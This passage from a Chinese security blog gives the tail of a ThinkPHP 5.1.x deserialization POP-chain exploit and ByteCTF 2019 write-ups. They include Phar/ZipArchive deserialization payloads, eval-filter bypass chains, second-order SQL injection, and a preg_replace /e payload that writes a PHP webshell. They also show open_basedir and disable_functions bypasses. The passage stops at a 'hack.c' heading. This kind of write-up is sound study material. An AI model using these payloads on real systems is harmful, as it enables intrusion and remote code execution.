URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>

<p>当时跟着pop链写了一下，始终不太行，最后发现conversion是trait声明的orz,，所以先去声明model类中再去继承就可以了。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://paper.seebug.org/1040/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1040/#_1</a></p>
<p><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/08/Thinkphp-5-1-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" data-id="ckabsu38p002bkkvrbbs92mbq" class="article-share-link" data-share="baidu" data-title="Thinkphp-5.1.x pop链分析">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/08/Thinkphp-5-1-x-pop%E9%93%BE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-ByteCTF2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/07/ByteCTF2019/" class="article-date">
  <time datetime="2019-10-07T01:57:34.000Z" itemprop="datePublished">2019-10-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/07/ByteCTF2019/">ByteCTF2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Bytectf和n1ctf撞了，由于一些原因必须得打n1ctf，打了两天..自闭了两天…到头来，tp5.2反序列化pop链还是没摸到….真难过…</p>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p><a href="http://www.zip下载下来主要有四个文件" target="_blank" rel="noopener">www.zip下载下来主要有四个文件</a></p>
<p>需要成为admin才能上传文件，源码发现存在典型的hash长度扩展攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: 13</span><br><span class="line">Input Data to Add: huaiqiu</span><br><span class="line">75c31d8ac465832c745e5e097afb12e5</span><br><span class="line">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00huaiqiu</span><br></pre></td></tr></table></figure>

<p>那就扩展一下</p>
<p>看看剩下的关键代码，主要就是这几个类了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $content = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    $black_list = [<span class="string">'system'</span>,<span class="string">'eval'</span>,<span class="string">'exec'</span>,<span class="string">'+'</span>,<span class="string">'passthru'</span>,<span class="string">'`'</span>,<span class="string">'assert'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($content, $v) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"your file make me scare"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看起来是一个检测文件内容的类，一个毫无作用的check函数.</p>
<p>之后的也是比较明显的的Phar触发点，和一些常规功能点，也就不在赘述了，先说一下自己最开始的思路：</p>
<p>Admin类中的upload函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'u r not admin'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content_check -&gt; check();</span><br><span class="line">    $tmp = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    $ext = end($tmp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"your file is too big"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="keyword">$this</span>-&gt;file_tmp, <span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/'</span>.md5(<span class="keyword">$this</span>-&gt;filename).<span class="string">'.'</span>.$ext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这道题会自动在你要上传文件的目录放一个导致你500的htaccess，那么解决的办法只有两个，第一个就是换个目录传，第二个目录是删掉htaccess</p>
<p>我开始研究的是第一个思路，我康upload_file中这个$this-&gt;upload_dir是可以更改的，那我在反序列化时候改一下它的值不就行了？之后大概看了一下upload.php，发现这个思路应该不行，关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$file_tmp = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$file_name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$file_size = $_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>];</span><br><span class="line">$file_error = $_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>];</span><br><span class="line"><span class="keyword">if</span> ($file_error &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"something error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$admin = <span class="keyword">new</span> Admin($file_name, $file_tmp, $file_size);</span><br><span class="line">$admin-&gt;upload_file();</span><br></pre></td></tr></table></figure>

<p>这个是上传文件时主要进行的操作，我们之前的思路是改dir,但是改dir的同时是要配合文件上传的，但是这里每次的文件上传都进行了一次New Admin，我们也可以看到在new的时候触发construct，所以dir并不是由我们决定的，所以只能换下一个思路了。</p>
<p>不放过每一个可疑点真的是很重要的一个思路</p>
<p>问题在于Profile类，下面这个__call并没有什么用处</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这应该就是所谓的为了出题而出题吧</p>
<p>那么结合之前的第二个删掉htaccess思路，这里就可能是利用某个类的open函数去删掉htaccess，fuzz一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SessionHandler-&gt;open</span><br><span class="line">ZipArchive-&gt;open</span><br><span class="line">XMLReader-&gt;open</span><br><span class="line">SQLite3-&gt;open</span><br></pre></td></tr></table></figure>

<p>最后可以发现ZipArchive-&gt;open可进行覆盖删除</p>
<p>这个覆盖我也稍微研究了一下，发现也很有趣，进一步思考了一下”覆盖”这两个字的意思</p>
<p>覆盖应该是分为两个过程的</p>
<ul>
<li>首先将已存在的文件删除</li>
<li>将你的覆盖文件放到被删除文件的位置</li>
</ul>
<p>那么这个ZipArchive的open函数不仅可以覆盖zip还可以覆盖其他文件，造成删除</p>
<p>最终exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $checker;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Profile;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $username=<span class="string">'The path of htaccess'</span>;</span><br><span class="line"><span class="keyword">public</span> $password=Zip::OVERWIRTE;</span><br><span class="line"><span class="keyword">public</span> $admin;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin=<span class="keyword">new</span> ZipArchive();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先上传个php文件，然后传个phar，php://fitler绕过过滤触发phar反序列化，最后访问php文件，拿到shell。</p>
<h3 id="Boring-Code"><a href="#Boring-Code" class="headerlink" title="Boring Code"></a>Boring Code</h3><p>挺有意思的一道题，源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的目的是拿到上层目录的index.php的源码，那么就意味着得跳目录，dirname被ban了，不能那么常规的跳了,但是拿到<code>..</code>就好,这点不难想到scandir扫出来的数组的第二个字符就是..,那么首先就得扫一下当前的目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.. &lt;&#x3D;&gt; next(scandir(&#39;.&#39;))</span><br></pre></td></tr></table></figure>

<p>扫当前的目录的话就是scandir(‘.’)，那么我们就需要拿到.字符，我首先想到的是chr出来，数字的问题的可以通过时间函数去解决，在手册上翻了翻时间的函数，最后找到了满足这个条件的函数localtime()</p>
<p><img src="https://s2.ax1x.com/2019/09/26/um5KsS.png" alt="um5KsS.png"></p>
<p>第一个元素是随着时间而增加的，也就是在每分钟的第四十六秒(current的话可以用pos绕过)，我们就可以拿到.这个字符，那么也就意味着我们拿到了..，但是我们必须要进入上层目录才能去读取那个文件，这个可以用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(next(scandir(<span class="string">'.'</span>)))</span><br></pre></td></tr></table></figure>

<p>不过这个返回的是个布尔值，那么我们怎么去解决这个问题呢，这里可以用time去接受这个布尔值</p>
<p><img src="https://s2.ax1x.com/2019/09/26/unamy6.png" alt="unamy6.png"></p>
<p>这里可以看到time的参数是void，那么我们无论传什么参数都不会影响函数的执行的，所以这个true用time接收就可以了</p>
<p>然后localtime函数再接受这个time(1)，最终拿到.，再次进行scandir，然后取end函数，通过readfile拿到flag</p>
<p>最终payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(pos(localtime()))))))))))))</span><br></pre></td></tr></table></figure>

<p>time的方法还是比较简单的，在网上也搜到了一些其他有趣的payload，来学一下</p>
<ul>
<li>第一种</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(serialize(file(end(scandir(chr(ord(chr(time(chdir(next(scandir(chr(ord(chr(time())))))))))))))));</span><br></pre></td></tr></table></figure>

<p>这个payload关键点和上面的其实差不多，但是echo(serialize(file()))这个操作挺有意思，因为file返回的是数组，所以先序列化一下，最后输出的序列化的值，但也可以直接readfile，在readfile过滤的情况下，我们就用这个了。</p>
<ul>
<li>第二种</li>
</ul>
<p>用localeconv取得.符号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>这个if是真的好用</p>
<ul>
<li>第三种</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可以变的更加复杂去绕过一些过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到陌小生大佬的博客中一条有趣的payload</p>
<p>通过chr(octdec(ord(ceil(sqrt(ord(exp()))))))拿到<code>.</code>，膜一下。</p>
<ul>
<li>第四种</li>
</ul>
<p>这是一个看起来很心酸的payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure>

<p>学习了。</p>
<p>这题有个坑点.之前不太明白，看到kn0ck的wp才恍然大悟</p>
<blockquote>
<p>p.s.坑点：一定要在服务器上起个服务，来打印以上语句。不能把他作为文件传上去。默认读取下载文件，会在后面加一个空行。空行过不了正则…</p>
</blockquote>
<p>所以我们要在我们的vps上把我们的payload echo出来</p>
<h3 id="BabyBlog"><a href="#BabyBlog" class="headerlink" title="BabyBlog"></a>BabyBlog</h3><p>首先题目给了源码</p>
<p>大致看了一下题目的代码</p>
<p>首先在config中对GET和POST变量进行了全局过滤</p>
<p>在对文章进行操作的时候都需要先进行从文章中拿出userid与用户的session中的id比较一下，如果相同的话即可进行操作，在edit.php中存在问题</p>
<p>首先也是判断row[‘id’]，如果一致就把这个页面渲染给用户，问题部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($sql-&gt;query(<span class="string">"select * from article where id="</span> . intval($_POST[<span class="string">'id'</span>]) . <span class="string">";"</span>) <span class="keyword">as</span> $v)&#123;</span><br><span class="line">        $row = $v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">        $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">        $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">        $sql-&gt;query(<span class="string">"update article set title='$title',content='$content' where title='"</span> . $row[<span class="string">'title'</span>] . <span class="string">"';"</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在update的时候$row[‘title’]可造成二次注入，我们可以直接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;; update users set isvip&#x3D;1 where username&#x3D;&#39;lihuaiqiu&#39;;</span><br></pre></td></tr></table></figure>

<p>插入进去一个vip用户</p>
<p>不过有过滤，这里可以用预处理bypass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">';set @test=0x757064617465757365727373657469737669703d317768657265757365726e616d653d276c6968756169716975273b;prepare sql from @test;execute sql;</span></span><br></pre></td></tr></table></figure>

<p>成为vip后我们就开启了replace功能，看一下replace.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'id'</span>] == $row[<span class="string">'userid'</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'regex'</span>]) &amp;&amp; $_POST[<span class="string">'regex'</span>] == <span class="string">'1'</span>)&#123;</span><br><span class="line">            $content = addslashes(preg_replace(<span class="string">"/"</span> . $_POST[<span class="string">'find'</span>] . <span class="string">"/"</span>, $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br><span class="line">            $sql-&gt;query(<span class="string">"update article set content='$content' where id="</span> . $row[<span class="string">'id'</span>] . <span class="string">";"</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Replaced successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $content = addslashes(str_replace($_POST[<span class="string">'find'</span>], $_POST[<span class="string">'replace'</span>], $row[<span class="string">'content'</span>]));</span><br><span class="line">            $sql-&gt;query(<span class="string">"update article set content='$content' where id="</span> . $row[<span class="string">'id'</span>] . <span class="string">";"</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('Replaced successfully.');location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"&lt;script&gt;alert('You do not have permission.');history.go(-1);&lt;/script&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>问题出现于</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content &#x3D; addslashes(preg_replace(&quot;&#x2F;&quot; . $_POST[&#39;find&#39;] . &quot;&#x2F;&quot;, $_POST[&#39;replace&#39;], $row[&#39;content&#39;]));</span><br></pre></td></tr></table></figure>

<p>这里我们的$_POST[‘find’]如果可控的话就可以自己通过%00截断来添加/e修饰符进而执行我们的php代码</p>
<p>find=/e%00&amp;replace=file_put_contents(“shell.php”,’&lt;?php eval($_POST[1]);’);</p>
<p>拿到shell后，看一下phpinfo();的信息，做了两层防护，一个disable_functions，一个open_basedir，</p>
<p>这个是个低版本的php,我们可以通过glob来bypass一下open_basedir</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($dh = opendir(<span class="string">"glob:///*"</span>)) &#123;</span><br><span class="line"><span class="keyword">while</span> (($file = readdir($dh)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$file\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">closedir($dh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到根目录下有readflag,那就是执行这个就行了，接着bypass disable_functions,大概试了一下,ban掉了mail，但是error_log依然在，所以可以直接通过error_log执行系统命令了</p>
<p>hack.c</p>
